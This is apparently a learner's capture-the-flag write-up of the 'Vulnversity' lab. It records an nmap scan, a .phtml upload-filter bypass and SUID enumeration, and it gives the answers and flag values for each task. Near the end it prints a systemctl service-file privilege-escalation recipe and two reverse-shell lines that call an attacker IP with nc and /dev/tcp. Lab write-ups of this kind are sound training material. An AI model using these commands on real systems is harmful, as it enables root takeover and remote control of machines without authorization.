06/16/2025

''Vulnversity
Note: Box seemed very unstable and constantly dropping packets. Ping reponse is less than 70% even after waiting 10 mins. Grrr

'''TASK 1

Fire up the box and wait a bit for pings to return
Create working folder and nmap folder

Setup IP variable for simplicity
Export IP=<ip address>
10.10.101.248

'''TASK 2

Q. Scan the box; 
#Nmap scan
#nmap -sC -sV -oN nmap/initial $IP

Results

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 20:43 EDT                                    
Nmap scan report for 10.10.82.241                                                                  
Host is up (0.15s latency).                                                                        
Not shown: 994 closed tcp ports (reset)                                                            
PORT     STATE SERVICE     VERSION                                                                 
21/tcp   open  ftp         vsftpd 3.0.5                                                            
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)           
| ssh-hostkey: 
|   3072 74:13:9e:22:29:6c:fb:c3:5c:da:c7:80:94:4d:b4:63 (RSA)
|   256 ba:21:a7:b5:4b:38:13:88:27:1f:f1:01:de:48:c0:58 (ECDSA)
|_  256 30:d4:46:5e:ec:78:6d:d6:95:d1:65:0a:6d:b5:23:73 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-06-19T00:44:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: IP-10-10-82-241, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.62 seconds

Q. How many ports are open?
A> 6

Q. What version of the squid proxy is running on the machine?
A.  4.10

Q. How many ports will Nmap scan if the flag -p-400 was used?
A. 400

Q. What is the most likely operating system this machine is running?
A. Ubuntu

Q. What port is the web server running on?
A. 3333

Q. What is the flag for enabling verbose mode using Nmap?
A. -v

''TASK 3

Q. What is the directory that has an upload form page?
A. /internal/

'''TASK 4

Q. What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
A. .php

Q. What extension is allowed after running the above exercise?
A. phtml

Q. What is the name of the user who manages the webserver?
A. bill

Q. What is the user flag?
A. 8bd7992fbe8a6ad22a63361004cfcedb

'''TASK 5

Q. On the system, search for all SUID files. Which file stands out?
A. /bin/systemctl

find / -type f -perm -04000 -ls 2>/dev/null
   396628     44 -rwsr-xr-x   1 root     root        41552 Feb  6  2024 /usr/bin/newuidmap
   395578     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /usr/bin/chfn
   396626     48 -rwsr-xr-x   1 root     root        45648 Feb  6  2024 /usr/bin/newgidmap
   396998    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
   400521     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /usr/bin/chsh
   400524     68 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /usr/bin/passwd
   419923     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
   397803     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /usr/bin/newgrp
   400523     88 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /usr/bin/gpasswd
   401943     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
   397519    156 -rwsr-xr-x   1 root     root       159304 Jan 15 15:02 /usr/lib/snapd/snap-confine
   419925     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   397315    468 -rwsr-xr-x   1 root     root       477672 Apr 11 08:16 /usr/lib/openssh/ssh-keysign
   401528     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   396651     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   404935    848 -rwsr-xr-x   1 root     root         866448 Feb  3  2022 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   133104     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /bin/su
   133153     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /bin/mount
   133154     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /bin/umount
   131094    976 -rwsr-xr-x   1 root     root         996584 Jun 17  2024 /bin/systemctl
   131086     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /bin/fusermount
      210    177 -rwsr-xr-x   1 root     root         180753 Apr  5 15:10 /snap/snapd/24505/usr/lib/snapd/snap-confine
      875     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /snap/core20/2582/usr/bin/chfn
      881     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /snap/core20/2582/usr/bin/chsh
      951     87 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /snap/core20/2582/usr/bin/gpasswd
     1035     55 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /snap/core20/2582/usr/bin/mount
     1044     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /snap/core20/2582/usr/bin/newgrp
     1059     67 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /snap/core20/2582/usr/bin/passwd
     1169     67 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /snap/core20/2582/usr/bin/su
     1170    163 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /snap/core20/2582/usr/bin/sudo
     1228     39 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /snap/core20/2582/usr/bin/umount
     1317     51 -rwsr-xr--   1 root     systemd-network    51344 Oct 25  2022 /snap/core20/2582/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1691    467 -rwsr-xr-x   1 root     root              477672 Apr 11 08:16 /snap/core20/2582/usr/lib/openssh/ssh-keysign
   393653     48 -rwsr-xr-x   1 root     root               48200 Apr  2 00:10 /sbin/mount.cifs

Q. What is the root flag value?
A. a58ff8579f0a9270368d33a9966c7fd5

https://gtfobins.github.io/gtfobins/systemctl/

Move to a writeable directory - I used /tmp

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

# We need to change the ExecStart command so I can create reverse shell as root. This is where my problems started...

Googling around I found 

ExecStart=/bin/sh -c "nc -e /bin/bash 10.2.57.121 9999"
# that didn't work. no -e option
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.57.121/5555 0>&1'
# this didn't work either. "Bad fd number"
More googling!
Finally I gave up on reverse shell and just decided to cat out the file and redirect it to a new file in temp I could read

ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"

That worked fine. 

REMINDER: I'll need to come back to this once I understand why nc -e isn't available and why bash has trouble with >&
